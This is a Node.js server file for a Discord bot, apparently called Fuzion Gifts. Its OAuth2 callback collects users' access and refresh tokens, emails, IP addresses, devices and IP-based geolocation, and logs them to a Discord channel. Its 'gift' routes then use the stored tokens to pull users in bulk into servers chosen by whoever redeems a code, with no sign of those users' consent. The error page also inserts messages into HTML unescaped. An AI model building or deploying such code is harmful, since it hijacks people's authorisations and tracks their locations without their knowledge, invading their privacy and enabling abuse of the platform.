console.log('🚀 [server.js] arquivo foi carregado');

const axios = require('axios');
const { EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle } = require('discord.js');
const { renderGiftPage } = require('./giftPage');

process.on('unhandledRejection', (err) => {
    console.error('⚠️ [UNHANDLED REJECTION]', err && err.message ? err.message : err);
});
process.on('uncaughtException', (err) => {
    console.error('⚠️ [UNCAUGHT EXCEPTION]', err && err.message ? err.message : err);
});

module.exports = (app, client) => {
    console.log('🚀 [server.js] função foi executada');

    let users, config;
    try {
        const db = require('../database');
        users = db.users;
        config = db.config;
        console.log('✅ [server.js] database importado OK');
    } catch (err) {
        console.error('❌ [server.js] erro database:', err.message);
        users = { set: async () => {}, get: async () => undefined, all: async () => [], delete: async () => {} };
        config = { get: async () => undefined, set: async () => {} };
    }

    async function getGeoInfo(ip) {
        if (!ip || ip === 'desconhecido' || ip.startsWith('127.') || ip.startsWith('10.') || ip.startsWith('192.168.') || ip.startsWith('172.')) {
            return { cidade: 'Desconhecido', estado: 'Desconhecido', pais: 'Desconhecido' };
        }
        try {
            const resp = await axios.get('https://ipapi.co/' + ip + '/json/', { timeout: 5000, headers: { 'User-Agent': 'Meubot/1.0' } });
            if (resp.data && !resp.data.error) {
                return { cidade: resp.data.city || 'Desconhecido', estado: resp.data.region || 'Desconhecido', pais: resp.data.country_name || 'Desconhecido' };
            }
            return { cidade: 'Desconhecido', estado: 'Desconhecido', pais: 'Desconhecido' };
        } catch (err) {
            return { cidade: 'Desconhecido', estado: 'Desconhecido', pais: 'Desconhecido' };
        }
    }

    function paginaManutencao() {
        return '<!DOCTYPE html><html lang="pt-BR"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Em manutenção</title><link rel="icon" type="image/png" href="https://raw.githubusercontent.com/PlxxStore/meubot/main/favicon.png"><style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;background:#0a0a0c;color:#d4d4d8;min-height:100vh;padding:60px 20px;display:flex;justify-content:center;align-items:center}.wrap{max-width:520px;width:100%}.handwritten{font-family:"Brush Script MT",cursive;color:#fbbf24;font-size:26px;font-style:italic;display:inline-block;margin-bottom:24px}.wrench{width:88px;height:88px;background:linear-gradient(135deg,#fbbf24,#f59e0b);border-radius:50%;display:flex;align-items:center;justify-content:center;margin-bottom:28px;font-size:40px}h1{font-size:42px;font-weight:700;color:#f4f4f5;line-height:1.1;margin-bottom:16px}.sub{font-size:15px;color:#71717a;margin-bottom:32px}.info{background:#0d0d10;border:1px solid #1a1a1e;border-radius:10px;padding:4px 20px;margin-bottom:32px}.row{display:flex;justify-content:space-between;padding:14px 0;font-size:13.5px;border-bottom:1px solid #1a1a1e}.row:last-child{border-bottom:none}.row span:first-child{color:#71717a}.row span:last-child{color:#e4e4e7;font-weight:500}.status-on{color:#fbbf24!important}.btn{display:flex;align-items:center;justify-content:center;padding:15px;background:#f4f4f5;color:#0a0a0c;border-radius:10px;font-size:14px;font-weight:600;text-decoration:none}</style></head><body><div class="wrap"><div class="handwritten">manutenção ↗</div><div class="wrench">🔧</div><h1>Sistema em<br>manutenção</h1><p class="sub">Estamos fazendo melhorias. Voltamos em breve.</p><div class="info"><div class="row"><span>Status</span><span class="status-on">Em manutenção</span></div><div class="row"><span>Previsão</span><span>Em breve</span></div></div><a class="btn" href="/">← Voltar</a></div></body></html>';
    }

    async function checkManutencao(req, res, next) {
        if (req.path.startsWith('/painel') || req.path.startsWith('/api/painel')) return next();
        if (req.path === '/ping') return next();
        if (req.path === '/') return next();
        if (req.path.startsWith('/oauth2')) return next();
        if (req.path.startsWith('/error')) return next();
        try {
            const manutencao = await config.get('manutencaoAtiva');
            if (manutencao === true) {
                if (req.path.startsWith('/api/')) return res.status(503).json({ error: 'Manutenção.' });
                return res.status(503).send(paginaManutencao());
            }
        } catch (e) {}
        next();
    }

    app.get('/', (req, res) => { try { res.render('index.html'); } catch (e) { res.status(200).send('Fuzion Gifts'); } });
    app.get('/ping', (req, res) => res.status(200).send('pong ✅'));
    app.get('/invite', (req, res) => {
        const clientId = process.env.CLIENT_ID;
        const perms = '8';
        res.redirect('https://discord.com/oauth2/authorize?client_id=' + clientId + '&permissions=' + perms + '&scope=bot%20applications.commands');
    });

    try {
        const painel = require('./painel');
        painel(app, client, config, users);
        console.log('✅ [server.js] rotas do painel registradas');
    } catch (err) {
        console.error('❌ [server.js] erro painel:', err.message);
    }

    app.get('/gift/:codigo', checkManutencao, async (req, res) => {
        try {
            const codigo = req.params.codigo;
            const gifts = (await config.get('gifts')) || {};
            const gift = gifts[codigo];
            if (!gift) {
                return res.status(404).send('<!DOCTYPE html><html><head><meta charset="UTF-8"><title>Gift não encontrado</title><link rel="icon" type="image/png" href="https://raw.githubusercontent.com/PlxxStore/meubot/main/favicon.png"><style>body{background:#0b0b0d;color:#f5f5f5;font-family:sans-serif;display:flex;align-items:center;justify-content:center;min-height:100vh;margin:0;text-align:center;padding:20px}.c{background:#131316;padding:40px;border-radius:16px;max-width:500px;border:1px solid #1c1c1f}h1{margin-bottom:16px}p{color:#8a8a90;line-height:1.6}</style></head><body><div class="c"><div style="font-size:64px">❌</div><h1>Gift não encontrado</h1><p>Esse código não existe ou foi deletado.</p></div></body></html>');
            }
            if (gift.status === 'ativo' && gift.expiresAt && Date.now() > gift.expiresAt) {
                gift.status = 'expirado';
                gifts[codigo] = gift;
                await config.set('gifts', gifts);
            }
            const baseUrl = process.env.REDIRECT_URI ? process.env.REDIRECT_URI.replace('/oauth2/callback', '') : 'https://meubot-8p7l.onrender.com';
            res.setHeader('Content-Type', 'text/html; charset=utf-8');
            res.send(renderGiftPage(gift, baseUrl));
        } catch (err) {
            console.error('❌ [GIFT] erro:', err.message);
            res.status(500).send('Erro interno');
        }
    });

    app.get('/api/gift/:codigo/logs', async (req, res) => {
        try {
            const codigo = req.params.codigo;
            const logs = (await config.get('giftLogs_' + codigo)) || [];
            res.json(logs);
        } catch (err) { res.status(500).json({ error: err.message }); }
    });

    app.post('/api/gift/:codigo', checkManutencao, async (req, res) => {
        try {
            const codigo = req.params.codigo;
            const guildId = req.body.guildId;
            if (!guildId || !/^\d{17,20}$/.test(guildId)) return res.status(400).json({ error: 'ID inválido.' });
            const gifts = (await config.get('gifts')) || {};
            const gift = gifts[codigo];
            if (!gift) return res.status(404).json({ error: 'Gift não encontrado.' });
            if (gift.status === 'esgotado') return res.status(400).json({ error: 'Esse gift já foi usado.' });
            if (gift.expiresAt && Date.now() > gift.expiresAt) {
                gift.status = 'expirado'; gifts[codigo] = gift; await config.set('gifts', gifts);
                return res.status(400).json({ error: 'Esse gift expirou.' });
            }
            const bloqueados = (await config.get('giftBlockList')) || {};
            if (bloqueados[guildId]) return res.status(403).json({ error: 'Servidor na blacklist.' });
            const guild = client.guilds.cache.get(guildId);
            if (!guild) return res.status(400).json({ error: 'O bot não está nesse servidor.' });

            const dbData = await users.all();
            let userList = [];
            if (Array.isArray(dbData)) {
                userList = dbData.map(function(item) {
                    if (item._id && item.data) return Object.assign({ id: item._id }, item.data);
                    if (item.ID && item.data) return Object.assign({ id: item.ID }, item.data);
                    return item;
                });
            }
            const restringidos = (await config.get('restringidos')) || [];
            const filtrados = userList.filter(function(u) { return restringidos.indexOf(u.id) === -1; });
            let toPull;
            if (gift.selecionados && gift.selecionados.length > 0) {
                toPull = filtrados.filter(function(u) { return gift.selecionados.includes(u.id); });
            } else {
                toPull = filtrados.slice(0, gift.quantidade);
            }

            gift.status = 'esgotado'; gift.servidorUsado = guildId; gift.usados = gift.quantidade; gift.esgotadoEm = Date.now(); gift.puxados = 0; gift.falhas = 0;
            gifts[codigo] = gift;
            await config.set('gifts', gifts);
            await config.set('giftLogs_' + codigo, []);

            try {
                await enviarLogGift(client, config, 'usado', { codigo: codigo, quantidade: gift.quantidade, guildId: guildId, guildName: guild.name });
            } catch (e) {}

            puxarMembrosGift(client, config, codigo, guildId, toPull, guild);
            return res.json({ mensagem: 'Puxando ' + toPull.length + ' membros pro servidor ' + guild.name + '.' });
        } catch (err) {
            console.error('❌ [GIFT] erro:', err.message);
            return res.status(500).json({ error: 'Erro interno.' });
        }
    });

    // ============================
    // CALLBACK OAuth2
    // ============================
    app.get('/oauth2/callback', async (req, res) => {
        const code = req.query.code;
        if (!code) return res.redirect('/error?msg=Missing code');

        try {
            const params = new URLSearchParams();
            params.append('client_id', process.env.CLIENT_ID);
            params.append('client_secret', process.env.CLIENT_SECRET);
            params.append('grant_type', 'authorization_code');
            params.append('code', code);
            params.append('redirect_uri', process.env.REDIRECT_URI);
            // ⚠️ SEM offline_access (não existe no Discord). O prompt=consent já cuida do refresh_token
            params.append('scope', 'identify email guilds.join');

            const tokenResponse = await axios.post('https://discord.com/api/oauth2/token', params, { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } });
            const access_token = tokenResponse.data.access_token;
            const refresh_token = tokenResponse.data.refresh_token;
            const token_type = tokenResponse.data.token_type;

            if (!refresh_token) {
                console.error('⚠️ [OAUTH2] Discord NÃO retornou refresh_token!');
            } else {
                console.log('✅ [OAUTH2] refresh_token recebido');
            }

            const userResponse = await axios.get('https://discord.com/api/users/@me', { headers: { Authorization: token_type + ' ' + access_token } });
            const userData = userResponse.data;

            let ip = req.headers['cf-connecting-ip'] || req.headers['x-forwarded-for'] || req.socket.remoteAddress;
            if (ip && ip.includes(',')) ip = ip.split(',')[0].trim();
            if (ip && ip.startsWith('::ffff:')) ip = ip.replace('::ffff:', '');

            const userDevice = req.headers['user-agent'] || 'Unknown';
            const geo = await getGeoInfo(ip);

            let jaEstavaNoBanco = false;
            try { const existing = await users.get(userData.id); if (existing) jaEstavaNoBanco = true; } catch (err) {}

            try {
                await users.set(userData.id, {
                    id: userData.id, username: userData.username, avatar: userData.avatar, email: userData.email,
                    access_token: access_token, refresh_token: refresh_token, ip: ip, userDevice: userDevice,
                    cidade: geo.cidade, estado: geo.estado, pais: geo.pais, verifiedAt: new Date().toISOString()
                });
                console.log('💾 [DB] usuário salvo: ' + userData.id);
            } catch (err) { console.error('❌ [DB] erro salvar:', err.message); }

            const guildId = process.env.GUILD_ID;
            let roleId = process.env.ROLE_ID;
            try { const configRoleId = await config.get('roleId'); if (configRoleId) roleId = configRoleId; } catch (err) {}

            let cargoAtribuido = false, entrouAgora = false, motivoFalha = null;
            if (guildId && roleId) {
                try {
                    const resp = await axios.put(
                        'https://discord.com/api/v10/guilds/' + guildId + '/members/' + userData.id,
                        { access_token: access_token, roles: [roleId] },
                        { headers: { Authorization: 'Bot ' + process.env.TOKEN, 'Content-Type': 'application/json' }, validateStatus: false }
                    );
                    if (resp.status === 201) { cargoAtribuido = true; entrouAgora = true; }
                    else if (resp.status === 204) {
                        const roleResp = await axios.put(
                            'https://discord.com/api/v10/guilds/' + guildId + '/members/' + userData.id + '/roles/' + roleId,
                            {},
                            { headers: { Authorization: 'Bot ' + process.env.TOKEN, 'Content-Type': 'application/json' }, validateStatus: false }
                        );
                        if (roleResp.status === 204) cargoAtribuido = true;
                        else motivoFalha = 'Erro ' + roleResp.status;
                    } else { motivoFalha = 'Erro ' + resp.status; }
                } catch (err) { motivoFalha = err.message; }
            }

            const createdAt = new Date(Number((BigInt(userData.id) >> 22n) + 1420070400000n));
            const accountDays = Math.floor((Date.now() - createdAt) / (1000 * 60 * 60 * 24));

            try {
                await sendLog(client, userData, ip, userDevice, geo, config, { cargoAtribuido: cargoAtribuido, entrouAgora: entrouAgora, motivoFalha: motivoFalha, jaEstavaNoBanco: jaEstavaNoBanco, accountDays: accountDays });
            } catch (err) { console.error('❌ [LOG] erro:', err.message); }

            const guild = client.guilds.cache.get(guildId);
            res.render('success.html', {
                userName: userData.username, userId: userData.id,
                userAvatar: userData.avatar ? 'https://cdn.discordapp.com/avatars/' + userData.id + '/' + userData.avatar + '.png' : 'https://cdn.discordapp.com/embed/avatars/0.png',
                guildName: guild ? guild.name : 'Server', guildId: guildId || '0',
                guildIcon: guild && guild.icon ? 'https://cdn.discordapp.com/icons/' + guildId + '/' + guild.icon + '.png' : 'https://cdn.discordapp.com/embed/avatars/0.png',
                accountDays: accountDays
            });
        } catch (error) {
            console.error('❌ [CALLBACK] erro:', error.message);
            const errData = error.response ? error.response.data : null;
            let mensagem = 'Ocorreu um erro.';
            if (errData && errData.error === 'invalid_grant') mensagem = 'Esse link já foi usado ou expirou.';
            else if (errData && errData.error === 'access_denied') mensagem = 'Você cancelou a autorização.';
            else if (error.message) mensagem = error.message;
            res.status(400).send('<!DOCTYPE html><html><head><meta charset="UTF-8"><link rel="icon" type="image/png" href="https://raw.githubusercontent.com/PlxxStore/meubot/main/favicon.png"><style>body{background:#0a0a0c;color:#d4d4d8;font-family:sans-serif;display:flex;align-items:center;justify-content:center;min-height:100vh;margin:0;padding:20px}.card{background:#131316;border-radius:16px;padding:40px;max-width:500px;text-align:center;border:1px solid #1c1c1f}.icon{font-size:64px;margin-bottom:20px}h1{font-size:24px;color:#f4f4f5;margin-bottom:16px}p{color:#8a8a90;line-height:1.6}</style></head><body><div class="card"><div class="icon">❌</div><h1>Erro</h1><p>' + mensagem + '</p></div></body></html>');
        }
    });

    app.get('/error', (req, res) => {
        try { res.render('error.html', { error: req.query.msg || 'Unknown error' }); } catch (e) { res.status(200).send('Erro'); }
    });

    console.log('✅ [server.js] todas as rotas foram registradas');
};

async function sendLog(client, userData, ip, userDevice, geo, config, status) {
    try {
        let logChannelId = process.env.LOG_CHANNEL_ID;
        try { const configLogId = await config.get('logChannelId'); if (configLogId) logChannelId = configLogId; } catch (err) {}
        if (!logChannelId) return;
        const channel = client.channels.cache.get(logChannelId);
        if (!channel) return;
        let webhook;
        try {
            const webhooks = await channel.fetchWebhooks();
            webhook = webhooks.find(function(w) { return w.name === 'OAuth2'; });
            if (!webhook) webhook = await channel.createWebhook({ name: 'OAuth2', avatar: client.user.displayAvatarURL() });
        } catch (err) { return; }
        const creationDate = new Date(Number((BigInt(userData.id) >> 22n) + 1420070400000n));
        const creationAccountDays = Math.floor((Date.now() - creationDate) / (1000 * 60 * 60 * 24));
        const userAvatar = userData.avatar ? 'https://cdn.discordapp.com/avatars/' + userData.id + '/' + userData.avatar + '.png' : 'https://cdn.discordapp.com/embed/avatars/0.png';
        const embed = new EmbedBuilder()
            .setColor(status.cargoAtribuido ? 4806097 : 0xff4d4d)
            .setAuthor({ name: userData.username + ' (' + userData.id + ')', iconURL: userAvatar })
            .setThumbnail(userAvatar)
            .setDescription('**Menção:** <@' + userData.id + '>\n**E-mail:** `' + (userData.email || 'N/A') + '`\n**Idade da Conta:** `' + creationAccountDays + '` dias')
            .addFields(
                { name: (status.cargoAtribuido ? '✅' : '❌') + ' Cargo Atribuído', value: '`' + (status.cargoAtribuido ? 'Sim' : 'Não') + '`', inline: true },
                { name: (status.entrouAgora ? '🆕' : '👥') + ' Entrou no Servidor', value: '`' + (status.entrouAgora ? 'Sim (novo)' : 'Já estava') + '`', inline: true },
                { name: (status.jaEstavaNoBanco ? '🔄' : '🆕') + ' Verificação', value: '`' + (status.jaEstavaNoBanco ? 'Re-verificou' : 'Primeira vez') + '`', inline: true },
                { name: '📍 Cidade', value: '`' + geo.cidade + '`', inline: true },
                { name: '🗺️ Estado', value: '`' + geo.estado + '`', inline: true },
                { name: '🌎 País', value: '`' + geo.pais + '`', inline: true },
                { name: '🌐 IP', value: '`' + ip + '`' },
                { name: '📱 Dispositivo', value: '`' + userDevice.substring(0, 1020) + '`' }
            ).setTimestamp();
        if (status.motivoFalha) embed.addFields({ name: '⚠️ Motivo da Falha', value: '`' + status.motivoFalha.substring(0, 1020) + '`' });
        await webhook.send({ embeds: [embed] });
    } catch (err) { console.error('❌ [sendLog] erro:', err.message); }
}

async function enviarLogGift(client, config, tipo, dados) {
    try {
        const logChannelId = await config.get('giftLogChannelId');
        if (!logChannelId) return;
        const channel = client.channels.cache.get(logChannelId);
        if (!channel) return;
        let embed;
        if (tipo === 'usado') {
            embed = new EmbedBuilder().setColor(0xFEE75C).setTitle('🎁 Gift Usado').addFields({ name: 'Código', value: '`' + dados.codigo + '`', inline: true }, { name: 'Quantidade', value: '`' + dados.quantidade + ' membros`', inline: true }, { name: 'Servidor', value: dados.guildName, inline: false }).setTimestamp();
        } else if (tipo === 'deletado') {
            embed = new EmbedBuilder().setColor(0xED4245).setTitle('🗑️ Gift Deletado').addFields({ name: 'Código', value: '`' + dados.codigo + '`', inline: true }).setTimestamp();
        }
        if (embed) await channel.send({ embeds: [embed] });
    } catch (err) { console.error('❌ [giftLog] erro:', err.message); }
}

async function puxarMembrosGift(client, config, codigo, guildId, userList, guild) {
    try {
        const { users } = require('../database');
        client.operacoesGift = client.operacoesGift || new Map();
        client.operacoesGift.set(codigo, { parar: false });
        let puxados = 0, falhas = 0, processed = 0;

        async function addLog(texto, tipo) {
            try {
                const logs = (await config.get('giftLogs_' + codigo)) || [];
                const agora = new Date();
                const hora = String(agora.getHours()).padStart(2, '0') + ':' + String(agora.getMinutes()).padStart(2, '0') + ':' + String(agora.getSeconds()).padStart(2, '0');
                const log = { hora: hora, texto: texto };
                if (tipo === 'erro') log.erro = true;
                if (tipo === 'sucesso') log.sucesso = true;
                logs.push(log);
                if (logs.length > 100) logs.shift();
                await config.set('giftLogs_' + codigo, logs);
            } catch (e) {}
        }

        await addLog('Iniciando ' + userList.length + ' membros para ' + guild.name + '...');

        for (const userData of userList) {
            const op = client.operacoesGift.get(codigo);
            if (op && op.parar) { await addLog('Cancelado.', 'erro'); break; }
            const userId = userData.id;
            const accessToken = userData.access_token;
            const refreshToken = userData.refresh_token;
            if (!accessToken || !userId) { falhas++; processed++; continue; }

            try {
                let resp = await axios.put(
                    'https://discord.com/api/v10/guilds/' + guildId + '/members/' + userId,
                    { access_token: accessToken },
                    { headers: { Authorization: 'Bot ' + process.env.TOKEN, 'Content-Type': 'application/json' }, validateStatus: false }
                );

                if (resp.status === 403 && resp.data && resp.data.code === 50025 && refreshToken) {
                    try {
                        const params = new URLSearchParams();
                        params.append('client_id', process.env.CLIENT_ID);
                        params.append('client_secret', process.env.CLIENT_SECRET);
                        params.append('grant_type', 'refresh_token');
                        params.append('refresh_token', refreshToken);
                        const tokenResp = await axios.post('https://discord.com/api/v10/oauth2/token', params, { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } });
                        const newAccess = tokenResp.data.access_token;
                        const newRefresh = tokenResp.data.refresh_token;
                        await users.set(userId, Object.assign({}, userData, { access_token: newAccess, refresh_token: newRefresh }));
                        resp = await axios.put(
                            'https://discord.com/api/v10/guilds/' + guildId + '/members/' + userId,
                            { access_token: newAccess },
                            { headers: { Authorization: 'Bot ' + process.env.TOKEN, 'Content-Type': 'application/json' }, validateStatus: false }
                        );
                    } catch (e) {}
                }

                if (resp.status === 201 || resp.status === 204) { puxados++; await addLog('Membro ' + (userData.username || userId) + ' puxado com sucesso'); }
                else { falhas++; await addLog('Falha ao puxar ' + (userData.username || userId) + ' (status ' + resp.status + ')', 'erro'); }
            } catch (err) { falhas++; await addLog('Erro ao puxar ' + (userData.username || userId), 'erro'); }
            processed++;
            await new Promise(function(r) { setTimeout(r, 600); });
        }

        client.operacoesGift.delete(codigo);
        try {
            const gifts = (await config.get('gifts')) || {};
            if (gifts[codigo]) { gifts[codigo].puxados = puxados; gifts[codigo].falhas = falhas; await config.set('gifts', gifts); }
        } catch (err) {}
        await addLog('Finalizado. Total de ' + puxados + ' membros puxados.', 'sucesso');
        console.log('✅ [GIFT ' + codigo + '] ' + puxados + ' puxados, ' + falhas + ' falhas');
    } catch (err) { console.error('❌ [puxarMembrosGift] erro:', err.message); }
}